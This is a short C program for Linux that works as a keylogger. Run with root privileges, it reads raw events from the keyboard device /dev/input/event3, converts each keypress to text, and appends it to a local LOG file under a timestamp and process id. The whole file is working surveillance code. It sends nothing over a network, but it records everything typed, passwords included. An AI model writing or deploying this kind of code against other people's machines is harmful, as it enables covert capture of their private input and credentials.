#include <linux/input.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <sys/types.h>
#include "keycodes/KeyCodeToASCII.h"

#define maxBufferSize 10
#define lineSize 99

int main (int argc, char** argv)
{
    struct input_event ev; /* this object will be our keypress event */
    int fd;
    FILE *inFile;
    int bufferSize;
    time_t t;
    struct tm tm;
    pid_t pid;

    /* Open the keyboard file for. This needs to be done with su priviliges but for now run program with sudo */
    fd = open("/dev/input/event3", O_RDONLY);

    /* open or create a file to log the keystrokes. Might require su priv 
     * devepending on the location of the file */
    inFile = fopen("./LOG", "a");
    bufferSize = 0;             /* for formatting and appending the keystroke to file */

    /* write init message in log file */
    t = time(NULL);
    tm = *localtime(&t);
    fprintf(inFile, "Starting Log ---- Curret time is: %d-%d-%d %d:%d:%d\n", tm.tm_year+1900, tm.tm_mon+1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);

    pid = getpid();
    fprintf(inFile, "process id of this program is %d\n", pid);
    while (read(fd, &ev, sizeof(struct input_event))) {
       /* printf("%d %s\n", ev.code, convertToASCII(ev.code));*/

       if (ev.type == 1 && ev.value != 0) {
            fprintf(inFile, "%s", convertToASCII(ev.code));
            if ((bufferSize++)==maxBufferSize) {
                bufferSize=0;
                fflush(inFile);
            }
        }
    }
    fclose(inFile);
    return 0;
}
